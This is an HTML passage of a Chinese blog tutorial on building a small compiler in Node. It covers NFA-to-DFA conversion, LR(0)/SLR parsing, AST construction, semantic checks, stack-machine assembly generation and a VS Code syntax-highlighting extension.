class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]======&gt; <span class="hljs-number">9</span><br>]<br></code></pre></td></tr></table></figure><p>可以验证下就是如下节点边值对(行索引对应source节点，列索引对应target节点，矩阵值就是边集合)：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">2</span>: i<br><br><span class="hljs-symbol">1 </span>=&gt; <span class="hljs-number">4</span>: null<br><br><span class="hljs-symbol">2 </span>=&gt; <span class="hljs-number">3</span>: f<br><br><span class="hljs-number">4</span>=&gt;<span class="hljs-number">5</span>: [a-z]<br><br><span class="hljs-number">5</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">6</span>=&gt;<span class="hljs-number">7</span>: [a-z] [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]<br><br><span class="hljs-number">7</span>=&gt;<span class="hljs-number">8</span>: null<br><br><span class="hljs-number">8</span>=&gt;<span class="hljs-number">6</span>: null<br></code></pre></td></tr></table></figure><h3 id="根据邻接矩阵构建dfa">根据邻接矩阵构建dfa</h3><p><span class="math display">\[Closure(S):S的可达闭包，表示从集合S出发，无需接受任何字符，即只通过epsilon边即可到达的状态组成的集合\\Closure(S) = S \cup(\bigcup_{m\in{S}}edge(m, \epsilon))，其中edge(m, \epsilon)\\表示从状态m出发沿着边c可到达的所有NFA状态的集合\]</span></p><p><span class="math display">\[假设状集合有如下几个状态：S=\{m, n, k\} \\从S的状态出发，沿着某条边c可到达的新的状态集合，表示为DFAedge(S, c) \\DFAedge(S, c) = Closure(\bigcup_{k\in{S}}edge(k, c))\]</span></p><p>有了Closure和DFAedge算法单元，这样从NFA的起点出发，不断的更新DFAedge(S,c)，每次新生成的DFAedge(S,c)，即得到DFA里的状态节点，据此得到dfa状态转移表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">states<span class="hljs-selector-attr">[0]</span> &lt;- <span class="hljs-selector-attr">[]</span> <br>states<span class="hljs-selector-attr">[1]</span> &lt;- <span class="hljs-built_in">Closure</span>(<span class="hljs-selector-attr">[S]</span>)<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-number">1</span>, j &lt;- <span class="hljs-number">0</span> <br>while j &lt;= <span class="hljs-selector-tag">p</span> <br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> 字母集 <br>e &lt;- <span class="hljs-built_in">DFAedge</span>(states<span class="hljs-selector-attr">[j]</span>, c) <br><span class="hljs-keyword">if</span> e == states<span class="hljs-selector-attr">[i]</span> <span class="hljs-keyword">for</span> some <span class="hljs-selector-tag">i</span> &lt;= <span class="hljs-selector-tag">p</span> <br>then trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">i</span><br><span class="hljs-keyword">else</span> <br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-number">1</span><br>states<span class="hljs-selector-attr">[p]</span> &lt;- e<br>trans<span class="hljs-selector-attr">[j]</span><span class="hljs-selector-attr">[c]</span> &lt;- <span class="hljs-selector-tag">p</span><br>j &lt;- j + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>构建完正则表达式之后就可以对我们的输入处理成token流了。(<code>lib =&gt; scan函数</code>)</p><h2 id="构建抽象语法树">构建抽象语法树</h2><p>这里我用的是简单的LR(0)上下无关文法，关于什么是上下无关文什么是有关文，请戳-&gt;,</p><p>理论上上下无关文法所代表的文法范围： LR(1) &gt; LSPR &gt; SLR &gt;LR(0) <strong>LR(0):</strong> 没有提前预测的符号，容易出现 shift-reduce冲突以及 reduce-reduce 冲突，所以需要设计适合的文法；<strong>SLR:</strong> 有简单的预测，可以用follow集解决部分shift-reduce冲突，但是在有些情况下还是 shift-reduce冲突 <strong>LR(1):</strong>可以解决 shift-reduce 冲突，也解决 reduce-reduce 冲突<strong>LSPR:</strong> 由于 LR(1)的表特别大，在此基础上做了优化</p><p>看如下文法的 LR(0)生成过程：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">E-&gt; Program $<br>P<span class="hljs-function"><span class="hljs-title">rogram</span> -&gt;</span> Assign == Assign<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Assign + Token<br>A<span class="hljs-function"><span class="hljs-title">ssign</span> -&gt;</span> Token<br>T<span class="hljs-function"><span class="hljs-title">oken</span> -&gt;</span> id<br></code></pre></td></tr></table></figure><p>LR(0)dfa</p><p><img src="../飞书20230430-125517.jpg" /></p><p>LR(0)对应的状态转移表： <img src="../飞书20230430-124728.jpg" /></p><p>可以看到在状态 9 是存在移位-规约冲突的，这是因为LR(0)默认在所有的终结符号处做规约。</p><p>slr 语法是比LR(0),更为广泛的一种语法，它只在特定的地方放置规约动作。具体来说，在上面的例子里，在状态9 处，只有规约式 1 的移位指针到达里末尾，所以可以看下规约式 1后面可能会紧接着什么符号，也就是 followSet(Program) ={$}，所以只在$处放置规约动作。 下面是 slr 分析表： <imgsrc="../飞书20230430-163301.jpg" /></p><h2 id="五ast生成">五、AST生成</h2><p>生成好分析表之后，就可以根据分析表进行语法分析了，如下所示，在提前定义好的文法产生式做对应的规约动作，如下case0就是<code>Formals -&gt; int,TOKEN.ID</code>，在这里利用栈内的元素生成Formal_Class；就这样每次在对应的文法产生式上对对应的做规约动作，从而完成自底向上的ast的构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><p>下图简单模拟了<code>int ID (int ID)</code>的token流处理过程，<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/stack.gif" class="" title="这是一张图片">在没有规约动作的时候token一直push进栈，直到有对应的规约动作，这个时候按照指定的规约动作，生成非终结符，再把该非终结符放入栈内，重复进行，直到栈内为空或者遇到了$，当然，如果在这过程中遇到了不合法的字符，直接抛出异常</p><p>以及生成的简单ast如下： <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Program</span>_Class &#123;<br>  <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>    <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>    <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Branch</span>_Class &#123;<br>      <span class="hljs-attr">ifCond</span>: <span class="hljs-title class_">Cond</span>_Class &#123;<br>        <span class="hljs-attr">lExpr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>        <span class="hljs-attr">rExpr</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;0&#x27;</span> &#125;,<br>        <span class="hljs-attr">op</span>: <span class="hljs-string">&#x27;==&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">statementTrue</span>: <span class="hljs-title class_">Return</span>_Class &#123; <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125; &#125;,<br>      <span class="hljs-attr">statementFalse</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;m&#x27;</span>,<br>        <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>          <span class="hljs-attr">params_list</span>: [ <span class="hljs-literal">undefined</span> ],<br>          <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>          <span class="hljs-attr">params</span>: <span class="hljs-title class_">Sub</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;1&#x27;</span> &#125;<br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>        &#125;,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>          <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;m&#x27;</span> &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;,<br>    <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>      <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span> ],<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;sum&#x27;</span>,<br>      <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>        <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>          <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>          <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;y&#x27;</span> &#125;<br>        &#125;<br>      &#125;,<br>      <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;y&#x27;</span>,<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;<br>      &#125;,<br>      <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>        <span class="hljs-attr">formal_list</span>: [],<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;main&#x27;</span>,<br>        <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>,<br>          <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>          <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;10&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;10&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;print&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;<br>        &#125;,<br>        <span class="hljs-attr">formals</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="六语义分析">六、语义分析</h2><p>在语义分析阶段可以做类型检查和基本的校验，这里放置了一些基本的类型检查动作：1. 必须要有main函数，main函数的返回值必须是整形 2.其他函数的返回值和实际返回值类型对应 3. 赋值语句左右两侧类型一致 4.同一个作用域不得出现同名变量 5. 变量必须先声明并初始化才能使用</p><h2 id="七汇编代码生成">七、汇编代码生成</h2><p>思路：遍历ast自上向下进行利用堆栈机代码生成，由于本语言比较简单，仅使用了3个寄存器，a0，v0，t0，其中v0是辅助寄存器帮助函数返回值存储以及系统调用的退出和打印；</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cgenForSub(e1, e2) &#123;<br>cgen(e1)<br>sw <span class="hljs-variable">$a0</span>, 0(<span class="hljs-variable">$29</span>)<br>addiu <span class="hljs-variable">$29</span>, <span class="hljs-variable">$29</span>, -4<br>cgen(e2)<br><span class="hljs-built_in">add</span> <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里最重要的点是对声明变量的内存分配以及取变量的时候，要知道对应的作用域链，该从哪个作用域获取变量，只要我们对基本的一些单元表达式做好了代码生成的工作，后面就是搭积木的工作了；下面是该语言的函数栈示意图：<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/%E9%A3%9E%E4%B9%A620230502-104729.jpg" class="" title="这是一张图片"></p><p>这里如何取参数？由于函数栈在扩增的时候，不太方便通过sp指针获取参数和变量的存储位置，所以这里使用fp指针去作为基地址，寻找参数和局部变量</p><p>关于作用域问题是采用的树结构存储(双向链表)，每次从当前所在作用域内寻找变量，再继续依次向上寻找，直到找到函数级作用域；</p><h2 id="八编写代码高亮语法插件">八、编写代码高亮语法插件：</h2><p>我这里是速成版，比较简单，只涉及简单的语法部分 需要安装：<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>如果是需要编写全新的插件，则允许： yo code 选择 new LanguageSupport，提示一些问题，按需填写即可，插件名称尽可能唯一，不然在插件市场里不好搜，运行完命令之后会有一个生成目录，编写高亮语法的文件在xxx.tmLanguage.json 文件里，如果你只是配置一个 VS Code中已有语言的语法，记得删掉生成的 package.json 中的 languages 配置。</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(编写插件vscode)</p><p>这里看下我的规则：</p><p>以及vscode里的settings.json文件： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 这里是自己所选择的主题颜色，我的是vscode默认的颜色</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 自定义或者符合标准规范的命名，对应插件里的xxx.tmLanguage.json文件里的name选项</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.json里的配置： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// 类型</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// 关键字</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//注释</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>踩坑点：</p><ol type="1"><li><p>因为是根据分词 token那一套来的，其实也就是对你的语言的文件后缀名，比如我这里是 mc后缀，会做一个词法分析，词法分析的正则是自己编写的，然后每个正则也有对应的name，vscode 在配置(setting.json 文件)里可以根据这些 name做颜色的映射。所以一定要记得简单的正则要在两边加\b\b，表示单词分界，我一开始没加这个总是不生效</p></li><li><p>关于 name的命名，其实有一套规范的标准，当然也可以随心自定义，我这里的？？？就是自定义的。</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 